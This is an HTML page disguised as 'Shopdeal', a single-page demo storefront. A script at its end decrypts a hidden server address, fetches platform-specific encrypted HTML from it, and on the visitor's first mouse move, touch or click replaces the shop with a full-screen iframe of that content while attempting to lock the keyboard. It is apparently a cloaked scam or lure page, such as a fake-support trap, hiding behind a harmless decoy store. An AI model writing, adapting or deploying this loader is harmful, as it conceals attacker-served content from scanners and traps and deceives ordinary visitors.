<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Help0x0x-MDs</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">

  <style>
  
    :root{
      --ink:#0b1020;
      --muted:#64748b;
      --line:#e9ebf2;
      --surface:#f8fafc;
      --brand:#6d28d9;
      --brand-dark:#5b21b6;
      --accent:#db2777;
      --radius:18px;
      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
      --max:1180px;
    }

    *,*::before,*::after{ box-sizing:border-box; }
    html{ scroll-behavior:smooth; }
    body{
      margin:0;
      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
      color:var(--ink);
      background:#fff;
      line-height:1.6;
      -webkit-font-smoothing:antialiased;
    }
    img{ max-width:100%; display:block; }
    a{ color:inherit; text-decoration:none; }
    button{ font:inherit; }
    ul{ list-style:none; margin:0; padding:0; }

    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }

    /* ============================================================
       LOADING POPUP
       ============================================================ */
    .popup{
      position:fixed; inset:0; z-index:9999;
      display:flex; align-items:center; justify-content:center;
      background:#fff; padding:24px;
    }
    .popup-content{
      width:100%; max-width:560px;
      text-align:center;
      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
    }
    @keyframes popIn{
      from{ opacity:0; transform:translateY(14px) scale(.98); }
      to{ opacity:1; transform:none; }
    }
    .loading-gif{
      width:120px; height:120px;
      margin:0 auto 26px;
    }
    .popup-title{
      font-size:clamp(1.3rem,2.6vw,1.6rem);
      font-weight:800; letter-spacing:-.025em;
      margin:0 0 8px;
    }
    .popup-content p.sub{
      margin:0 0 32px;
      color:var(--muted);
      font-size:.95rem;
      font-weight:500;
    }
    .buttons{
      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
    }
    .buttons button{
      min-width:152px;
      padding:14px 30px;
      border:0; border-radius:13px;
      cursor:pointer; font-weight:700; font-size:1rem;
      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
    }
    #cancelBtn{ background:#f1f5f9; color:#334155; }
    #cancelBtn:hover{ background:#e2e8f0; }
    #continueBtn{
      background:linear-gradient(135deg,var(--brand),var(--accent));
      color:#fff;
      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
    }
    #continueBtn:hover{ transform:translateY(-2px); }

    .hint{
      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
      color:#ede9fe;
      text-align:center;
      font-size:.82rem;
      font-weight:600;
      letter-spacing:.02em;
      padding:11px 20px;
      min-height:42px;
      display:flex; align-items:center; justify-content:center;
      gap:10px;
    }

    .nav{
      position:sticky; top:0; z-index:80;
      display:flex; align-items:center; gap:26px;
      height:72px;
      padding:0 max(24px, calc((100vw - var(--max)) / 2));
      background:rgba(255,255,255,.86);
      backdrop-filter:blur(16px);
      -webkit-backdrop-filter:blur(16px);
      border-bottom:1px solid var(--line);
    }
    .brand{
      display:flex; align-items:center; gap:11px;
      font-weight:800; font-size:1.12rem;
      letter-spacing:-.025em; white-space:nowrap;
    }
    .brand-mark{
      width:36px; height:36px; flex:none;
      display:grid; place-items:center;
      border-radius:11px; font-size:1rem;
      background:linear-gradient(135deg,var(--brand),var(--accent));
      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
    }

    .links{ display:flex; gap:6px; }
    .links a{
      font-size:.9rem; font-weight:500; color:#4b5563;
      padding:8px 14px; border-radius:10px;
      transition:color .18s ease, background .18s ease;
    }
    .links a:hover{ color:var(--brand); background:#f5f3ff; }

    .clock{
      margin-left:auto;
      display:inline-flex; align-items:center; gap:6px;
      font-size:.78rem; font-weight:600; color:var(--brand-dark);
      background:#f5f3ff; border:1px solid #ede9fe;
      padding:7px 13px; border-radius:999px; white-space:nowrap;
    }
    .cart-btn{
      display:inline-flex; align-items:center; gap:8px;
      border:0; cursor:pointer;
      background:var(--ink); color:#fff;
      font-weight:600; font-size:.88rem;
      padding:10px 18px; border-radius:999px;
      transition:transform .18s ease, background .18s ease;
    }
    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
    .cart-btn .badge{
      background:#fff; color:var(--ink);
      border-radius:999px; min-width:20px; height:20px;
      display:grid; place-items:center;
      padding:0 6px; font-size:.72rem; font-weight:800;
    }

    @media (max-width:900px){
      .links{ display:none; }
      .clock{ display:none; }
    }
    @media (max-width:560px){
      .nav{ gap:14px; height:66px; padding-inline:18px; }
      .cart-btn{ padding:9px 14px; font-size:.82rem; }
    }

    /* ============================================================
       HERO
       ============================================================ */
    .hero{
      display:grid;
      grid-template-columns:1.03fr .97fr;
      gap:60px; align-items:center;
      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
      background:
        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
        linear-gradient(180deg,#fbfaff,#fff);
    }
    @media (max-width:960px){
      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
    }

    .eyebrow{
      display:inline-flex; align-items:center; gap:8px;
      background:#fff; border:1px solid #ede9fe;
      color:var(--brand-dark);
      font-size:.78rem; font-weight:700;
      letter-spacing:.06em; text-transform:uppercase;
      padding:7px 15px; border-radius:999px;
      box-shadow:var(--shadow-sm);
      margin-bottom:20px;
    }
    .eyebrow .dot{
      width:7px; height:7px; border-radius:50%;
      background:var(--accent);
      box-shadow:0 0 0 4px rgba(219,39,119,.16);
    }

    .hero-text h1{
      font-size:clamp(2.2rem,5vw,3.4rem);
      line-height:1.08; letter-spacing:-.035em;
      font-weight:900; margin:0 0 18px;
    }
    .hero-text h1 span{
      background:linear-gradient(115deg,var(--brand),var(--accent));
      -webkit-background-clip:text; background-clip:text; color:transparent;
    }
    .hero-text p{
      font-size:1.05rem; color:var(--muted);
      max-width:490px; margin:0 0 30px;
    }

    .cta{
      display:inline-flex; align-items:center; gap:9px;
      padding:15px 30px; border-radius:999px;
      background:linear-gradient(135deg,var(--brand),var(--accent));
      color:#fff; font-weight:700; font-size:.95rem;
      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
      transition:transform .18s ease, box-shadow .18s ease;
    }
    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }

    .hero-stats{
      display:flex; gap:34px; flex-wrap:wrap;
      margin-top:40px; padding-top:26px;
      border-top:1px solid var(--line);
    }
    .hero-stats strong{
      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
    }
    .hero-stats span{ font-size:.82rem; color:var(--muted); }

    .hero-img{
      width:100%; aspect-ratio:5/4; object-fit:cover;
      border-radius:26px;
      box-shadow:var(--shadow-lg);
    }

    /* ============================================================
       TRUST STRIP
       ============================================================ */
    .trust{
      border-block:1px solid var(--line);
      background:var(--surface);
    }
    .trust-grid{
      display:grid; grid-template-columns:repeat(4,1fr);
      gap:10px; padding:22px 0;
    }
    .trust-item{
      display:flex; align-items:center; justify-content:center; gap:9px;
      font-size:.85rem; font-weight:600; color:#475569;
      padding:6px 10px; border-right:1px solid var(--line);
    }
    .trust-item:last-child{ border-right:0; }
    .trust-item span{ font-size:1.05rem; }
    @media (max-width:860px){
      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
      .trust-item{ border-right:0; justify-content:flex-start; }
    }

    /* ============================================================
       SECTIONS
       ============================================================ */
    .section{ padding:76px 0; }
    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
    .section-head .kicker{
      display:inline-block;
      font-size:.76rem; font-weight:800;
      letter-spacing:.12em; text-transform:uppercase;
      color:var(--brand); margin-bottom:10px;
    }
    .section-head h2{
      font-size:clamp(1.6rem,3.2vw,2.2rem);
      font-weight:900; letter-spacing:-.03em;
      margin:0 0 10px; line-height:1.15;
    }
    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }


    .grid{
      display:grid; gap:24px;
      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
    }
    .card{
      display:flex; flex-direction:column;
      background:#fff; border:1px solid var(--line);
      border-radius:var(--radius); overflow:hidden;
      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
    }
    .card:hover{
      transform:translateY(-6px);
      box-shadow:var(--shadow-lg);
      border-color:transparent;
    }
    .card-media{
      position:relative; aspect-ratio:4/3;
      overflow:hidden; background:#f1f5f9;
    }
    .card-media img{
      width:100%; height:100%; object-fit:cover;
      transition:transform .55s cubic-bezier(.2,.7,.3,1);
    }
    .card:hover .card-media img{ transform:scale(1.07); }

    .card .badge{
      position:absolute; top:12px; left:12px;
      font-size:.68rem; font-weight:800; letter-spacing:.06em;
      text-transform:uppercase; color:#fff;
      padding:6px 11px; border-radius:999px;
      background:var(--ink);
    }
    .card .badge--sale{ background:var(--accent); }
    .card .badge--new{ background:#0ea5e9; }

    .card .body{
      padding:16px 18px 18px;
      display:flex; flex-direction:column; flex:1;
    }
    .card .cat{
      font-size:.7rem; font-weight:700; letter-spacing:.1em;
      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
    }
    .card h3{
      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
    }
    .price-row{
      display:flex; align-items:baseline; gap:8px;
      margin-top:auto; padding-top:6px;
    }
    .card .price{
      font-size:1.12rem; font-weight:800;
      letter-spacing:-.02em; color:var(--ink);
    }
    .card .old{
      font-size:.85rem; color:#a3aab8;
      text-decoration:line-through; font-weight:500;
      margin:0;
    }
    .save{
      margin-left:auto;
      font-size:.7rem; font-weight:800;
      color:#047857; background:#ecfdf5;
      padding:3px 8px; border-radius:999px;
    }

    .add{
      margin-top:14px; width:100%;
      display:inline-flex; align-items:center; justify-content:center; gap:8px;
      border:1px solid var(--ink); background:#fff; color:var(--ink);
      font-weight:700; font-size:.88rem;
      padding:11px; border-radius:11px; cursor:pointer;
      transition:background .2s ease, color .2s ease, transform .18s ease;
    }
    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
    .add:active{ transform:translateY(0); }

  
    .about{
      background:var(--surface);
      border-block:1px solid var(--line);
    }
    .features{
      display:grid; gap:22px;
      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
    }
    .feature{
      background:#fff; border:1px solid var(--line);
      border-radius:var(--radius);
      padding:28px 24px;
      text-align:left;
      transition:transform .22s ease, box-shadow .22s ease;
    }
    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
    .feature span{
      display:grid; place-items:center;
      width:48px; height:48px;
      border-radius:14px; font-size:1.3rem;
      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
      border:1px solid #ede9fe;
      margin-bottom:16px;
    }
    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }

    /* ============================================================
       FOOTER
       ============================================================ */
    .footer{
      background:#0b1020;
      color:#94a3b8;
      text-align:center;
      padding:44px 24px;
      font-size:.85rem;
    }
    .footer .fbrand{
      display:inline-flex; align-items:center; gap:10px;
      color:#fff; font-weight:800; font-size:1rem;
      letter-spacing:-.02em; margin-bottom:10px;
    }
    .footer p{ margin:0 0 6px; }
    .footer small{ color:#64748b; font-size:.78rem; }

  
    @media (prefers-reduced-motion:reduce){
      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
      html{ scroll-behavior:auto; }
    }
  </style>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>


</head>
<body>

  <div class="popup" id="customPopup">
    <div class="popup-content">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
      <h2 class="popup-title">Loading... Please wait.</h2>
      <p class="sub">We're checking your connection.</p>
      <div class="buttons">
        <button id="cancelBtn" type="button">Cancel</button>
        <button id="continueBtn" type="button">Continue</button>
      </div>
    </div>
  </div>
  
  <div id="shop">
    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>

    <header class="nav">
      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
      <nav class="links">
        <a href="#home">Home</a>
        <a href="#products">Products</a>
        <a href="#about">About</a>
      </nav>
      <span class="clock">🕒 Mon, 29 Jun 2026</span>
      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
    </header>

    <section class="hero" id="home">
      <div class="hero-text">
        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
        <a href="#products" class="cta">Shop now →</a>

        <div class="hero-stats">
          <div><strong>12,480+</strong><span>Happy customers</span></div>
          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
          <div><strong>48 hrs</strong><span>US delivery</span></div>
        </div>
      </div>
      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
    </section>

    <!-- Histats.com  START  (aync)-->
   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    (function() {
    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
    hs.src = ('//s10.histats.com/js15_as.js');
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
    })();</script>
    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
    <!-- Histats.com  END  -->

    <!-- Trust strip -->
    <div class="trust">
      <div class="container trust-grid">
        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
        <div class="trust-item"><span>↩️</span> 30-day returns</div>
        <div class="trust-item"><span>🔒</span> Secure checkout</div>
        <div class="trust-item"><span>💬</span> 7-day support</div>
      </div>
    </div>

    <section class="section" id="products">
      <div class="container">
        <div class="section-head">
          <span class="kicker">Featured</span>
          <h2>Handpicked for you</h2>
          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
        </div>

        <div class="grid">
          <article class="card">
            <div class="card-media">
              <span class="badge badge--sale">Best Seller</span>
              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
            </div>
            <div class="body">
              <span class="cat">Footwear</span>
              <h3>Running Sneakers</h3>
              <div class="price-row">
                <span class="price">$89.99</span>
                <span class="old">$139.99</span>
                <span class="save">−36%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card">
            <div class="card-media">
              <span class="badge">Limited</span>
              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
            </div>
            <div class="body">
              <span class="cat">Accessories</span>
              <h3>Classic Watch</h3>
              <div class="price-row">
                <span class="price">$179.99</span>
                <span class="old">$249.99</span>
                <span class="save">−28%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card">
            <div class="card-media">
              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
            </div>
            <div class="body">
              <span class="cat">Bags</span>
              <h3>Travel Backpack</h3>
              <div class="price-row">
                <span class="price">$69.99</span>
                <span class="old">$109.99</span>
                <span class="save">−36%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card">
            <div class="card-media">
              <span class="badge badge--new">New</span>
              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
            </div>
            <div class="body">
              <span class="cat">Audio</span>
              <h3>Wireless Headphones</h3>
              <div class="price-row">
                <span class="price">$119.99</span>
                <span class="old">$179.99</span>
                <span class="save">−33%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card">
            <div class="card-media">
              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
            </div>
            <div class="body">
              <span class="cat">Eyewear</span>
              <h3>Sunglasses</h3>
              <div class="price-row">
                <span class="price">$34.99</span>
                <span class="old">$59.99</span>
                <span class="save">−42%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card">
            <div class="card-media">
              <span class="badge">Top Rated</span>
              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
            </div>
            <div class="body">
              <span class="cat">Photography</span>
              <h3>Instant Camera</h3>
              <div class="price-row">
                <span class="price">$219.99</span>
                <span class="old">$299.99</span>
                <span class="save">−27%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>
        </div>
      </div>
    </section>

    <section id="about" class="section about">
      <div class="container">
        <div class="section-head">
          <span class="kicker">Why Shopdeal</span>
          <h2>Built around you</h2>
          <p>Simple pricing, fast delivery and support that actually answers.</p>
        </div>

        <div class="features">
          <div class="feature">
            <span>🚚</span>
            <h3>Free Shipping</h3>
            <p>Free standard delivery on every US order over $75. No codes needed.</p>
          </div>
          <div class="feature">
            <span>↩️</span>
            <h3>Easy Returns</h3>
            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
          </div>
          <div class="feature">
            <span>🔒</span>
            <h3>Secure Checkout</h3>
            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
          </div>
          <div class="feature">
            <span>⚡</span>
            <h3>Fast Support</h3>
            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
          </div>
        </div>
      </div>
    </section>

    <footer class="footer">
      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
      <p>© 2026 Shopdeal · Single-page demo store</p>
      <small>Images: picsum.photos</small>
    </footer>
  </div>


  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
    webkitallowfullscreen mozallowfullscreen
    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
    style="width:100%; height:100%; border:0;"></iframe>
</div>

<script>
  const PASSPHRASE = "98yNCjeAfWMwk0wI";
  const URL_KEY   = "UrLk3yShopEase01";
  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";

  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
  const DATA_URL = DATA_ORIGIN + "/data";

  
  (function warmup() {
    try {
      const o = new URL(DATA_ORIGIN).origin;

      
      const pc = document.createElement("link");
      pc.rel = "preconnect";
      pc.href = o;
      pc.crossOrigin = "anonymous";
      document.head.appendChild(pc);

     
      const dns = document.createElement("link");
      dns.rel = "dns-prefetch";
      dns.href = o;
      document.head.appendChild(dns);

      
      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
    } catch (e) {}
  })();

  
  let lastUrl = null;
  let readyPromise = null;

  function detectPlatform() {
    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
              navigator.platform || navigator.userAgent || "";
    return /mac/i.test(p) ? "mac" : "win";
  }

  function secureKeyboardAccess() {
    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
  }

  async function preloadSecret() {
    if (readyPromise) return readyPromise;
    readyPromise = (async () => {
      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
      const { cipher } = await res.json();
      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
      if (!html) throw new Error("Decrypt failed — wrong key?");
      if (lastUrl) URL.revokeObjectURL(lastUrl);
      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
      return lastUrl;
    })();
    return readyPromise;
  }

  async function showSecret() {
    const shop = document.getElementById("shop");
    const frame = document.getElementById("frame");
    const contentIframe = document.getElementById("contentiframe");
    try {
      const url = await preloadSecret();
      frame.src = url;
      shop.style.display = "none";
      contentIframe.style.display = "block";
      document.getElementById("customPopup").style.display = "none";
      secureKeyboardAccess();
    } catch (e) {
      document.querySelector(".hint").textContent = "⚠️ " + e.message;
      document.getElementById("customPopup").style.display = "none";
    }
  }

  
  preloadSecret().catch(() => {});

 
  window.addEventListener("mousemove", showSecret, { once: true });
  window.addEventListener("touchstart", showSecret, { once: true });
  window.addEventListener("click", showSecret, { once: true });
</script>
</body>
</html>